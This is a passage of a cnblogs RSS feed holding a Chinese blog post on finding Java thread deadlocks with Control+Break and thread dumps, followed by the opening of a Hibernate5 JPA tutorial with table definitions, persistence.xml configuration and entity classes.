<dc:identifier>https://www.cnblogs.com/aarond/p/or-tool.html</dc:identifier>
</item>
<item>
<title>troubleshoot之:用control+break解决线程死锁问题 - flydean</title>
<link>http://www.cnblogs.com/flydean/p/jvm-diagnostic-control-break.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/flydean/p/jvm-diagnostic-control-break.html</guid>
<description>&lt;p&gt;如果我们在程序中遇到线程死锁的时候，该怎么去解决呢？&lt;/p&gt;
&lt;p&gt;本文将会从一个实际的例子出发，一步一步的揭开java问题解决的面纱。&lt;/p&gt;

&lt;p&gt;写过java多线程程序的人应该都知道，多线程中一个很重要的事情就是状态的同步，但是在状态同步的过程中，一不小心就有可能会导致死锁的问题。&lt;/p&gt;
&lt;p&gt;一个最简单的死锁情况就是thread1占有资源1，然后又要去获取资源2. 而thread2占有资源2，又要去获取资源1的情况。&lt;/p&gt;
&lt;p&gt;举个具体的例子：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public class TestDeadLock {
    public static Object lock1= new Object();
    public static Object lock2= new Object();
    public static void main(String[] args) {
        Runnable runnable1= ()-&amp;gt; {
            System.out.println(&quot;in lock1&quot;);
            synchronized(lock1){
                System.out.println(&quot;Lock1 lock obj1&quot;);
                try {
                    Thread.sleep(3000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                synchronized(lock2){
                    System.out.println(&quot;Lock1 lock obj2&quot;);
                }
            }
        };

        Runnable runnable2= ()-&amp;gt; {
            System.out.println(&quot;in lock2&quot;);
            synchronized(lock2){
                System.out.println(&quot;Lock2 lock obj2&quot;);
                try {
                    Thread.sleep(3000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                synchronized(lock1){
                    System.out.println(&quot;Lock2 lock obj1&quot;);
                }
            }
        };

        Thread a = new Thread(runnable1);
        Thread b = new Thread(runnable2);
        a.start();
        b.start();
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;我们运行上面的代码：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;in lock1
Lock1 lock obj1
in lock2
Lock2 lock obj2
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;发送了锁循环等待的情况，程序执行不下去了，发送了死锁。&lt;/p&gt;

&lt;p&gt;在代码很简单的情况下，我们很容易就能分析出来死锁的原因，但是如果是在一个非常庞大的线上项目的时候，分析代码就没有那么容易了。&lt;/p&gt;
&lt;p&gt;怎么做呢？&lt;/p&gt;
&lt;p&gt;今天教给大家一个方法，使用control+break命令。&lt;/p&gt;
&lt;p&gt;control+break在linux表示的是Control+backslash，而在Windows下面就是Control+Break按钮。&lt;/p&gt;
&lt;p&gt;当然，还有一个更加通用的就是使用：&lt;/p&gt;
&lt;p&gt;kill -QUIT pid命令。&lt;/p&gt;
&lt;p&gt;我们用jps命令获取到执行java程序的进程id，然后执行kill -QUIT命令。&lt;/p&gt;
&lt;p&gt;执行完毕，我们会发现运行的java进程会输出一些额外的日志，这些额外的日志就是我们找出死锁的关键因素。&lt;/p&gt;
&lt;p&gt;注意，这个kill命令并不会终止程序的运行。&lt;/p&gt;
&lt;p&gt;输出的内容比较多，我们一部分一部分的讲解。&lt;/p&gt;
&lt;h2 id=&quot;full-thread-dump&quot;&gt;Full thread dump&lt;/h2&gt;
&lt;p&gt;日志的第一部分就是Full thread dump，包含了JVM中的所有线程的状态信息。&lt;/p&gt;
&lt;p&gt;我们看一下我们代码中的两个关键线程信息：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;&quot;Thread-0&quot; #13 prio=5 os_prio=31 cpu=4.86ms elapsed=230.16s tid=0x00007fc926061800 nid=0x6403 waiting for monitor entry  [0x0000700008d6a000]
   java.lang.Thread.State: BLOCKED (on object monitor)
        at com.flydean.TestDeadLock.lambda$main$0(TestDeadLock.java:21)
        - waiting to lock &amp;lt;0x0000000787e868f0&amp;gt; (a java.lang.Object)
        - locked &amp;lt;0x0000000787e868e0&amp;gt; (a java.lang.Object)
        at com.flydean.TestDeadLock$$Lambda$14/0x0000000800b69840.run(Unknown Source)
        at java.lang.Thread.run(java.base@14.0.1/Thread.java:832)

&quot;Thread-1&quot; #14 prio=5 os_prio=31 cpu=4.32ms elapsed=230.16s tid=0x00007fc924869800 nid=0x6603 waiting for monitor entry  [0x0000700008e6d000]
   java.lang.Thread.State: BLOCKED (on object monitor)
        at com.flydean.TestDeadLock.lambda$main$1(TestDeadLock.java:36)
        - waiting to lock &amp;lt;0x0000000787e868e0&amp;gt; (a java.lang.Object)
        - locked &amp;lt;0x0000000787e868f0&amp;gt; (a java.lang.Object)
        at com.flydean.TestDeadLock$$Lambda$15/0x0000000800b69c40.run(Unknown Source)
        at java.lang.Thread.run(java.base@14.0.1/Thread.java:832)
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;上面的输出列出了线程名字，线程的优先级，cpu时间，是否是daemon线程，线程ID，线程状态等有用的信息。&lt;/p&gt;
&lt;p&gt;看到上面的输出，我们看到两个线程都是处于BLOCKED状态，都在等待object monitor。&lt;/p&gt;
&lt;p&gt;还记得线程的几个状态吗？ 我们再来复习一下。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20200704111005149.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_0,text_aHR0cDovL3d3dy5mbHlkZWFuLmNvbQ==,size_35,color_8F8F8F,t_70&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;死锁检测&quot;&gt;死锁检测&lt;/h2&gt;
&lt;p&gt;接下来的部分就是我们最关心的死锁检测了。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;Found one Java-level deadlock:
=============================
&quot;Thread-0&quot;:
  waiting to lock monitor 0x00007fc926807e00 (object 0x0000000787e868f0, a java.lang.Object),
  which is held by &quot;Thread-1&quot;

&quot;Thread-1&quot;:
  waiting to lock monitor 0x00007fc926807f00 (object 0x0000000787e868e0, a java.lang.Object),
  which is held by &quot;Thread-0&quot;

Java stack information for the threads listed above:
===================================================
&quot;Thread-0&quot;:
        at com.flydean.TestDeadLock.lambda$main$0(TestDeadLock.java:21)
        - waiting to lock &amp;lt;0x0000000787e868f0&amp;gt; (a java.lang.Object)
        - locked &amp;lt;0x0000000787e868e0&amp;gt; (a java.lang.Object)
        at com.flydean.TestDeadLock$$Lambda$14/0x0000000800b69840.run(Unknown Source)
        at java.lang.Thread.run(java.base@14.0.1/Thread.java:832)
&quot;Thread-1&quot;:
        at com.flydean.TestDeadLock.lambda$main$1(TestDeadLock.java:36)
        - waiting to lock &amp;lt;0x0000000787e868e0&amp;gt; (a java.lang.Object)
        - locked &amp;lt;0x0000000787e868f0&amp;gt; (a java.lang.Object)
        at com.flydean.TestDeadLock$$Lambda$15/0x0000000800b69c40.run(Unknown Source)
        at java.lang.Thread.run(java.base@14.0.1/Thread.java:832)

Found 1 deadlock.

&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;上面的日志我们可以很明显的看出来，两个线程分别获得了对方需要的锁，所以导致了死锁。&lt;/p&gt;
&lt;p&gt;同时还详细的列出了thread stack的信息，供我们分析。&lt;/p&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;如果我们添加了参数-XX:+PrintConcurrentLocks，还会输出各个线程的获得的concurrent lock信息。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;heap信息&quot;&gt;Heap信息&lt;/h2&gt;
&lt;p&gt;最后一部分是Heap的统计信息：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;Heap
 garbage-first heap   total 133120K, used 3888K [0x0000000780000000, 0x0000000800000000)
  region size 1024K, 4 young (4096K), 0 survivors (0K)
 Metaspace       used 1122K, capacity 4569K, committed 4864K, reserved 1056768K
  class space    used 108K, capacity 412K, committed 512K, reserved 1048576K
&lt;/code&gt;
&lt;/pre&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;如果我们添加了-XX:+PrintClassHistogram命令，还可以额外的输出class直方图统计信息。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;上面就是使用Control+Break命令来分析java死锁问题的具体例子，希望大家能够喜欢。&lt;/p&gt;
&lt;blockquote readability=&quot;8.25&quot;&gt;
&lt;p&gt;本文作者：flydean程序那些事&lt;/p&gt;
&lt;p&gt;本文链接：&lt;a href=&quot;http://www.flydean.com/jvm-diagnostic-control-break/&quot;&gt;http://www.flydean.com/jvm-diagnostic-control-break/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;本文来源：flydean的博客&lt;/p&gt;
&lt;p&gt;欢迎关注我的公众号:程序那些事，更多精彩等着您！&lt;/p&gt;
&lt;/blockquote&gt;
</description>
<pubDate>Sat, 08 Aug 2020 13:52:00 +0000</pubDate>
<dc:creator>flydean</dc:creator>
<og:description>简介 如果我们在程序中遇到线程死锁的时候，该怎么去解决呢？ 本文将会从一个实际的例子出发，一步一步的揭开java问题解决的面纱。 死锁的代码 写过java多线程程序的人应该都知道，多线程中一个很重要的</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/flydean/p/jvm-diagnostic-control-break.html</dc:identifier>
</item>
<item>
<title>学习Hibernate5 JPA这一篇就够了 - 轻松的小希</title>
<link>http://www.cnblogs.com/caochenlei/p/13460373.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/caochenlei/p/13460373.html</guid>
<description>&lt;p&gt;&lt;strong&gt;配套资料，免费下载&lt;/strong&gt;&lt;br/&gt;链接：&lt;a href=&quot;https://pan.baidu.com/s/158JkczSacADez-fEMDXSYQ&quot;&gt;https://pan.baidu.com/s/158JkczSacADez-fEMDXSYQ&lt;/a&gt;&lt;br/&gt;提取码：2ce1&lt;br/&gt;复制这段内容后打开百度网盘手机App，操作更方便哦&lt;/p&gt;
&lt;h2 id=&quot;第一章-hibernate5-jpa快速入门&quot;&gt;第一章 Hibernate5 JPA快速入门&lt;/h2&gt;
&lt;h3 id=&quot;11、hibernate5-jpa概述&quot;&gt;1.1、Hibernate5 JPA概述&lt;/h3&gt;
&lt;p&gt;JPA的全称是Java Persistence API， 即Java 持久化API，是SUN公司推出的一套基于ORM的规范，内部是由一系列的接口和抽象类构成。JPA通过JDK 5.0注解描述对象－关系表的映射关系，并将运行期的实体对象持久化到数据库中&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://gitee.com/caochenlei/BlogImages/raw/master/20200808110321.jpg&quot; alt=&quot;fd5e9c1f88bcdb6c41f6685998b44e0f068.jpg&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;但是JPA仅仅只是一套接口规范和抽象类，并不能真正的去干活，因此，就有很多厂商实现了JPA的规范，提供了相应的技术支持，就类似实现了JDBC的MySQL驱动，而本节课程将采用Hibernate实现作为驱动使用，因此我称之为Hibernate5 JPA&lt;/p&gt;
&lt;h3 id=&quot;12、hibernate5-jpa下载&quot;&gt;1.2、Hibernate5 JPA下载&lt;/h3&gt;
&lt;p&gt;官方网址：&lt;a href=&quot;http://hibernate.org/orm/&quot;&gt;hibernate orm&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;目录介绍：&lt;/p&gt;
&lt;p&gt;hibernate-release-5.0.7.Final文件夹介绍：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://gitee.com/caochenlei/BlogImages/raw/master/20200804215452.png&quot; alt=&quot;image-20200804215450351&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;hibernate-release-5.0.7.Final\lib文件夹介绍：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://gitee.com/caochenlei/BlogImages/raw/master/20200808110713.png&quot; alt=&quot;image-20200808110712846&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;13、hibernate5-jpa工程搭建&quot;&gt;1.3、Hibernate5 JPA工程搭建&lt;/h3&gt;
&lt;p&gt;前边学习的Hibernate，接下来进行工程搭建，根Hibernate相比，它只需要再多加入一个包就行&lt;/p&gt;
&lt;p&gt;把下面四个文件夹的内容全部拷贝到lib中&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;hibernate-release-5.0.7.Final\lib\required&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;https://gitee.com/caochenlei/BlogImages/raw/master/20200804232428.png&quot; alt=&quot;image-20200804232427671&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;hibernate-release-5.0.7.Final\lib\optional\c3p0&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;https://gitee.com/caochenlei/BlogImages/raw/master/20200804231639.png&quot; alt=&quot;image-20200804231638012&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;hibernate-release-5.0.7.Final\lib\jpa&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;https://gitee.com/caochenlei/BlogImages/raw/master/20200808105907.png&quot; alt=&quot;image-20200808105905572&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;日志记录包&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;https://gitee.com/caochenlei/BlogImages/raw/master/20200804232407.png&quot; alt=&quot;image-20200804232406439&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;数据库驱动&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;https://gitee.com/caochenlei/BlogImages/raw/master/20200805105714.png&quot; alt=&quot;image-20200805105713238&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;把下面五个文件夹的内容全部拷贝到lib中后，全部选中，右键Build Path一下&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://gitee.com/caochenlei/BlogImages/raw/master/20200808111222.png&quot; alt=&quot;image-20200808111218855&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;Java工程搭建好了以后，我们需要有一个数据库（hibernate_jpa）和两张表用于测试：&lt;/p&gt;
&lt;p&gt;crm_cst_customer（客户表）&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-mysql&quot;&gt;CREATE TABLE `cst_customer` (
  `cust_id` BIGINT(32) NOT NULL AUTO_INCREMENT COMMENT '客户编号(主键)',
  `cust_name` VARCHAR(32) DEFAULT NULL COMMENT '客户名称',
  `cust_source` VARCHAR(32) DEFAULT NULL COMMENT '客户信息来源',
  `cust_industry` VARCHAR(32) DEFAULT NULL COMMENT '客户所属行业',
  `cust_level` VARCHAR(32) DEFAULT NULL COMMENT '客户级别',
  `cust_phone` VARCHAR(64) DEFAULT NULL COMMENT '固定电话',
  `cust_mobile` VARCHAR(16) DEFAULT NULL COMMENT '移动电话',
  PRIMARY KEY (`cust_id`)
) ENGINE=INNODB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;crm_cst_linkman（联系人表）&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-mysql&quot;&gt;CREATE TABLE `cst_linkman` (
  `lkm_id` BIGINT(32) NOT NULL AUTO_INCREMENT COMMENT '联系人编号(主键)',
  `lkm_name` VARCHAR(16) DEFAULT NULL COMMENT '联系人姓名',
  `lkm_gender` CHAR(1) DEFAULT NULL COMMENT '联系人性别',
  `lkm_phone` VARCHAR(16) DEFAULT NULL COMMENT '联系人办公电话',
  `lkm_mobile` VARCHAR(16) DEFAULT NULL COMMENT '联系人手机',
  `lkm_email` VARCHAR(64) DEFAULT NULL COMMENT '联系人邮箱',
  `lkm_qq` VARCHAR(16) DEFAULT NULL COMMENT '联系人qq',
  `lkm_position` VARCHAR(16) DEFAULT NULL COMMENT '联系人职位',
  `lkm_memo` VARCHAR(512) DEFAULT NULL COMMENT '联系人备注',
  `lkm_cust_id` BIGINT(32) NOT NULL COMMENT '客户id',
  PRIMARY KEY (`lkm_id`),
  KEY `FK_cst_linkman_lkm_cust_id` (`lkm_cust_id`),
  CONSTRAINT `FK_cst_linkman_lkm_cust_id` FOREIGN KEY (`lkm_cust_id`) REFERENCES `cst_customer` (`cust_id`) ON DELETE NO ACTION ON UPDATE NO ACTION
) ENGINE=INNODB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;在Java工程的src路径下创建一个名为META-INF的文件夹，在此文件夹下创建一个名为persistence.xml的配置文件&lt;/p&gt;
&lt;p&gt;通用配置文件（掌握）：&lt;/p&gt;
&lt;p&gt;persistence.xml（全路径：/hibernate_jpa/src/META-INF/persistence.xml）&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-xml&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
&amp;lt;persistence xmlns=&quot;http://java.sun.com/xml/ns/persistence&quot;
        xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
        xsi:schemaLocation=&quot;http://java.sun.com/xml/ns/persistence  
    http://java.sun.com/xml/ns/persistence/persistence_2_0.xsd&quot;
        version=&quot;2.0&quot;&amp;gt;
        &amp;lt;!-- 
                配置持久化单元
                        * name                          ：持久化单元名称
                        * transaction-type      ：持久化单元事务类型
                                JTA                             ：开启JTA分布式事务
                                RESOURCE_LOCAL  ：开启本地事务
         --&amp;gt;
        &amp;lt;persistence-unit name=&quot;myJpa&quot; transaction-type=&quot;RESOURCE_LOCAL&quot;&amp;gt;
                &amp;lt;!-- 配置JPA服务提供商 --&amp;gt;
                &amp;lt;provider&amp;gt;org.hibernate.jpa.HibernatePersistenceProvider&amp;lt;/provider&amp;gt;
                &amp;lt;!-- 配置JPA的基本参数 --&amp;gt;
                &amp;lt;properties&amp;gt;
                        &amp;lt;!-- 配置数据库驱动 --&amp;gt;
                        &amp;lt;property name=&quot;javax.persistence.jdbc.driver&quot; value=&quot;com.mysql.jdbc.Driver&quot; /&amp;gt;
                        &amp;lt;!-- 配置数据库地址 --&amp;gt;
                        &amp;lt;property name=&quot;javax.persistence.jdbc.url&quot; value=&quot;jdbc:mysql://127.0.0.1:3306/hibernate_jpa&quot; /&amp;gt;
                        &amp;lt;!-- 配置数据库账户 --&amp;gt;
                        &amp;lt;property name=&quot;javax.persistence.jdbc.user&quot; value=&quot;root&quot; /&amp;gt;
                        &amp;lt;!-- 配置数据库密码 --&amp;gt;
                        &amp;lt;property name=&quot;javax.persistence.jdbc.password&quot; value=&quot;root&quot; /&amp;gt;
                        
                        &amp;lt;!-- 配置JPA服务提供商可选参数 --&amp;gt;
                        &amp;lt;property name=&quot;hibernate.show_sql&quot; value=&quot;true&quot; /&amp;gt;
                        &amp;lt;property name=&quot;hibernate.format_sql&quot; value=&quot;true&quot; /&amp;gt;
                        &amp;lt;property name=&quot;hibernate.hbm2ddl.auto&quot; value=&quot;create&quot; /&amp;gt;
                &amp;lt;/properties&amp;gt;
        &amp;lt;/persistence-unit&amp;gt;
&amp;lt;/persistence&amp;gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;整合C3P0连接池版本配置文件（了解）：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-xml&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
&amp;lt;persistence xmlns=&quot;http://java.sun.com/xml/ns/persistence&quot;
        xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
        xsi:schemaLocation=&quot;http://java.sun.com/xml/ns/persistence  
    http://java.sun.com/xml/ns/persistence/persistence_2_0.xsd&quot;
        version=&quot;2.0&quot;&amp;gt;
        &amp;lt;!-- 
                配置持久化单元
                        * name                          ：持久化单元名称
                        * transaction-type      ：持久化单元事务类型
                                JTA                             ：开启JTA分布式事务
                                RESOURCE_LOCAL  ：开启本地事务
         --&amp;gt;
        &amp;lt;persistence-unit name=&quot;myJpa&quot; transaction-type=&quot;RESOURCE_LOCAL&quot;&amp;gt;
                &amp;lt;!-- 配置JPA服务提供商 --&amp;gt;
                &amp;lt;provider&amp;gt;org.hibernate.jpa.HibernatePersistenceProvider&amp;lt;/provider&amp;gt;
                &amp;lt;!-- 配置JPA的基本参数 --&amp;gt;
                &amp;lt;properties&amp;gt;
                        &amp;lt;!-- Hibernate JPA基本配置 --&amp;gt;
                        &amp;lt;property name=&quot;hibernate.connection.driver_class&quot; value=&quot;com.mysql.jdbc.Driver&quot; /&amp;gt;
                        &amp;lt;property name=&quot;hibernate.connection.url&quot; value=&quot;jdbc:mysql://127.0.0.1:3306/hibernate_jpa&quot; /&amp;gt;
                        &amp;lt;property name=&quot;hibernate.connection.username&quot; value=&quot;root&quot; /&amp;gt;
                        &amp;lt;property name=&quot;hibernate.connection.password&quot; value=&quot;root&quot; /&amp;gt;
                        &amp;lt;property name=&quot;hibernate.connection.isolation&quot; value=&quot;4&quot; /&amp;gt;
                        &amp;lt;property name=&quot;hibernate.dialect&quot; value=&quot;org.hibernate.dialect.MySQLDialect&quot; /&amp;gt;
                        &amp;lt;property name=&quot;hibernate.current_session_context_class&quot; value=&quot;thread&quot; /&amp;gt;

                        &amp;lt;!-- Hibernate JPA可选配置 --&amp;gt;
                        &amp;lt;property name=&quot;hibernate.show_sql&quot; value=&quot;true&quot; /&amp;gt;
                        &amp;lt;property name=&quot;hibernate.format_sql&quot; value=&quot;true&quot; /&amp;gt;
                        &amp;lt;property name=&quot;hibernate.hbm2ddl.auto&quot; value=&quot;create&quot; /&amp;gt;

                        &amp;lt;!-- Hibernate JPA整合C3P0数据库连接池 --&amp;gt;
                        &amp;lt;property name=&quot;hibernate.connection.provider_class&quot; value=&quot;org.hibernate.connection.C3P0ConnectionProvider&quot; /&amp;gt;
                        &amp;lt;!-- 数据库连接池的最小连接数 --&amp;gt;
                        &amp;lt;property name=&quot;c3p0.min_size&quot; value=&quot;5&quot; /&amp;gt;
                        &amp;lt;!-- 数据库连接池的最大连接数 --&amp;gt;
                        &amp;lt;property name=&quot;c3p0.max_size&quot; value=&quot;30&quot; /&amp;gt;
                        &amp;lt;!-- 最大空闲时间，60秒内未使用则连接被丢弃。若为0则永不丢弃。Default: 0 --&amp;gt;
                        &amp;lt;property name=&quot;c3p0.maxIdleTime&quot; value=&quot;60&quot; /&amp;gt;
                        &amp;lt;!-- 获得连接的超时时间,如果超过这个时间,会抛出异常，单位毫秒 --&amp;gt;
                        &amp;lt;property name=&quot;c3p0.timeout&quot; value=&quot;1800&quot; /&amp;gt;
                        &amp;lt;!-- 最大的PreparedStatement的数量 --&amp;gt;
                        &amp;lt;property name=&quot;c3p0.max_statements&quot; value=&quot;50&quot; /&amp;gt;
                        &amp;lt;!-- 每隔120秒检查连接池里的空闲连接，单位是秒 --&amp;gt;
                        &amp;lt;property name=&quot;c3p0.idle_test_period&quot; value=&quot;120&quot; /&amp;gt;
                        &amp;lt;!-- 当连接池里面的连接用完的时候，C3P0一下获取的新的连接数 --&amp;gt;
                        &amp;lt;property name=&quot;c3p0.acquire_increment&quot; value=&quot;1&quot; /&amp;gt;
                        &amp;lt;!-- 是否每次都验证连接是否可用 --&amp;gt;
                        &amp;lt;property name=&quot;c3p0.validate&quot; value=&quot;false&quot; /&amp;gt;
                &amp;lt;/properties&amp;gt;
        &amp;lt;/persistence-unit&amp;gt;
&amp;lt;/persistence&amp;gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;对于本节课程来说，使用哪一个都可以，但是第一个更通用，更简单，我们采用第一个，配置文件有了以后，我们需要编写实体类跟数据库表的映射关系&lt;/p&gt;
&lt;p&gt;Customer.java（全路径：/hibernate_jpa/src/com/caochenlei/hibernate/jpa/Customer.java）&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;package com.caochenlei.hibernate.jpa;

import javax.persistence.Column;
import javax.persistence.Entity;
import javax.persistence.GeneratedValue;
import javax.persistence.GenerationType;
import javax.persistence.Id;
import javax.persistence.Table;

/**
 * @Entity      ：声明是一个实体类
 * @Table       ：配置实体类和表的映射关系
 *      * name  ：配置数据库表的名称
 */
@Entity
@Table(name = &quot;cst_customer&quot;)
public class Customer {

        /**
         * @Id                          ：声明主键的配置
         * @GeneratedValue      ：配置主键的生成策略
         *      strategy：
         *          GenerationType.IDENTITY     ：自增（底层数据库必须支持自动增长），mysql
         *          GenerationType.SEQUENCE     ：序列（底层数据库必须支持序列），oracle
         *          GenerationType.TABLE        ：JPA提供的一种机制，通过一张数据库表的形式帮助我们完成主键自增
         *          GenerationType.AUTO         ：由程序自动的帮助我们选择主键生成策略
         * @Column                      ：配置属性和字段的映射关系
         *              name            ：数据库表中字段的名称
         */
        @Id
        @GeneratedValue(strategy = GenerationType.IDENTITY)
        @Column(name = &quot;cust_id&quot;)
        private Long custId;

        @Column(name = &quot;cust_name&quot;)
        private String custName;

        @Column(name = &quot;cust_source&quot;)
        private String custSource;

        @Column(name = &quot;cust_industry&quot;)
        private String custIndustry;

        @Column(name = &quot;cust_level&quot;)
        private String custLevel;

        @Column(name = &quot;cust_phone&quot;)
        private String custPhone;

        @Column(name = &quot;cust_mobile&quot;)
        private String custMobile;

        public Long getCustId() {
                return custId;
        }

        public void setCustId(Long custId) {
                this.custId = custId;
        }

        public String getCustName() {
                return custName;
        }

        public void setCustName(String custName) {
                this.custName = custName;
        }

        public String getCustSource() {
                return custSource;
        }

        public void setCustSource(String custSource) {
                this.custSource = custSource;
        }

        public String getCustIndustry() {
                return custIndustry;
        }

        public void setCustIndustry(String custIndustry) {
                this.custIndustry = custIndustry;
        }

        public String getCustLevel() {
                return custLevel;
        }

        public void setCustLevel(String custLevel) {
                this.custLevel = custLevel;
        }

        public String getCustPhone() {
                return custPhone;
        }

        public void setCustPhone(String custPhone) {
                this.custPhone = custPhone;
        }

        public String getCustMobile() {
                return custMobile;
        }

        public void setCustMobile(String custMobile) {
                this.custMobile = custMobile;
        }

        @Override
        public String toString() {
                return &quot;Customer [custId=&quot; + custId + &quot;, custName=&quot; + custName + &quot;, custSource=&quot; + custSource + &quot;, custIndustry=&quot; + custIndustry + &quot;, custLevel=&quot; + custLevel + &quot;, custPhone=&quot; + custPhone + &quot;, custMobile=&quot; + custMobile + &quot;]&quot;;
        }

}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;LinkMan.java（全路径：/hibernate_jpa/src/com/caochenlei/hibernate/jpa/LinkMan.java）&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;package com.caochenlei.hibernate.jpa;

import javax.persistence.CascadeType;
import javax.persistence.Column;
import javax.persistence.Entity;
import javax.persistence.FetchType;
import javax.persistence.GeneratedValue;
import javax.persistence.GenerationType;
import javax.persistence.Id;
import javax.persistence.JoinColumn;
import javax.persistence.ManyToOne;
import javax.persistence.Table;

@Entity
@Table(name = &quot;cst_linkman&quot;)
public class LinkMan {

        @Id
        @GeneratedValue(strategy = GenerationType.IDENTITY)
        @Column(name = &quot;lkm_id&quot;)
        private Long lkmId;

        @Column(name = &quot;lkm_name&quot;)
        private String lkmName;

        @Column(name = &quot;lkm_gender&quot;)
        private String lkmGender;

        @Column(name = &quot;lkm_phone&quot;)
        private String lkmPhone;

        @Column(name = &quot;lkm_mobile&quot;)
        private String lkmMobile;

        @Column(name = &quot;lkm_email&quot;)
        private String lkmEmail;

        @Column(name = &quot;lkm_qq&quot;)
        private String lkmQq;

        @Column(name = &quot;lkm_position&quot;)
        private String lkmPosition;

        @Column(name = &quot;lkm_memo&quot;)
        private String lkmMemo;

        public Long getLkmId() {
                return lkmId;
        }

        public void setLkmId(Long lkmId) {
                this.lkmId = lkmId;
        }

        public String getLkmName() {
                return lkmName;
        }

        public void setLkmName(String lkmName) {
                this.lkmName = lkmName;
        }

        public String getLkmGender() {
                return lkmGender;
        }

        public void setLkmGender(String lkmGender) {
                this.lkmGender = lkmGender;
        }

        public String getLkmPhone() {
                return lkmPhone;
        }

        public void setLkmPhone(String lkmPhone) {
                this.lkmPhone = lkmPhone;
        }

        public String getLkmMobile() {
                return lkmMobile;
        }

        public void setLkmMobile(String lkmMobile) {
                this.lkmMobile = lkmMobile;
        }

        public String getLkmEmail() {
                return lkmEmail;
        }

        public void setLkmEmail(String lkmEmail) {
                this.lkmEmail = lkmEmail;
        }

        public String getLkmQq() {
                return lkmQq;
        }

        public void setLkmQq(String lkmQq) {
                this.lkmQq = lkmQq;
        }

        public String getLkmPosition() {
                return lkmPosition;
        }

        public void setLkmPosition(String lkmPosition) {
                this.lkmPosition = lkmPosition;
        }

        public String getLkmMemo() {
                return lkmMemo;
        }

        public void setLkmMemo(String lkmMemo) {
                this.lkmMemo = lkmMemo;
        }

        @Override
        public String toString() {
                return &quot;LinkMan [lkmId=&quot; + lkmId + &quot;, lkmName=&quot; + lkmName + &quot;, lkmGender=&quot; + lkmGender + &quot;, lkmPhone=&quot; + lkmPhone + &quot;, lkmMobile=&quot; + lkmMobile + &quot;, lkmEmail=&quot; + lkmEmail + &quot;, lkmQq=&quot; + lkmQq + &quot;, lkmPosition=&quot; + lkmPosition + &quot;, lkmMemo=&quot; + lkmMemo + &quot;]&quot;;
        }

}
&lt;/code&gt;
&lt;/pre&gt;
